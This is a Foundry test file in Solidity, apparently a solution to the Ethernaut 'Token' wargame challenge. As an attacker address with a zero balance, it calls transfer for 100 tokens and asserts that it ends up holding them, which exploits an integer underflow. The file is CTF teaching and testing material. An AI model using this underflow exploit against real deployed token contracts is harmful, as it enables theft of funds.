// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Test, console} from "forge-std/Test.sol";

import {Token} from "../../src/ethernaut/Token.sol";

contract TokenHack is Test{
    Token target;

    function setUp() public {
        target = new Token(100);
    }

    function test_Token() public {
        address attacker = vm.addr(1);
        uint256 balance = 1 ether;
        vm.deal(attacker, balance);

        uint256 balanceBefore = target.balanceOf(attacker);
        assertEq(balanceBefore, 0);

        // Attack
        vm.startPrank(attacker);
        target.transfer(address(target), 100);

        uint256 balanceAfter = target.balanceOf(attacker);
        assertEq(balanceAfter, 100);
    }
}